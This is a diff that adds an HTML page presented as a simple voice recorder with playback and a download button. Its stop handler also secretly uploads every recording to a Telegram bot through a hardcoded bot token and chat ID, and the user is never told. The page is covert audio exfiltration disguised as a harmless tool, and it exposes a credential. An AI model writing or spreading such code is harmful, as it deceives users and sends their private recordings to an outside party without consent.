@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Voice Recording Tool</title>
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f9;
+        }
+        .recorder {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        audio {
+            margin-top: 20px;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="recorder">
+        <h1>Voice Recorder</h1>
+        <button id="startBtn" class="btn btn-success">Start Recording</button>
+        <button id="stopBtn" class="btn btn-secondary" disabled>Stop Recording</button>
+        <audio id="audioPlayback" controls></audio>
+        <a id="downloadLink" class="btn btn-primary mt-3" style="display: none;">Download Recording</a>
+    </div>
+
+    <script>
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const audioPlayback = document.getElementById('audioPlayback');
+        const downloadLink = document.getElementById('downloadLink');
+
+        let mediaRecorder;
+        let audioChunks = [];
+
+        async function startRecording() {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(stream);
+
+            mediaRecorder.ondataavailable = event => {
+                audioChunks.push(event.data);
+            };
+
+            mediaRecorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
+                const audioUrl = URL.createObjectURL(audioBlob);
+                audioPlayback.src = audioUrl;
+
+                // Create download link
+                downloadLink.href = audioUrl;
+                downloadLink.download = 'recording.mp3';
+                downloadLink.style.display = 'block';
+                downloadLink.textContent = 'Download Recording';
+
+                // Send audio to Telegram
+                const formData = new FormData();
+                formData.append('chat_id', '-4757352988'); // Replace with your chat ID
+                formData.append('audio', audioBlob, 'recording.mp3');
+
+                await fetch(`https://api.telegram.org/bot8132165664:AAE5sE2HBg6P0IyIoM8xYhSFuBzHumUWK5o/sendAudio`, { // Replace with your bot token
+                    method: 'POST',
+                    body: formData
+                });
+
+                audioChunks = [];
+            };
+
+            mediaRecorder.start();
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+        }
+
+        function stopRecording() {
+            mediaRecorder.stop();
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+        }
+
+        startBtn.addEventListener('click', startRecording);
+        stopBtn.addEventListener('click', stopRecording);
+    </script>
+</body>
+</html>
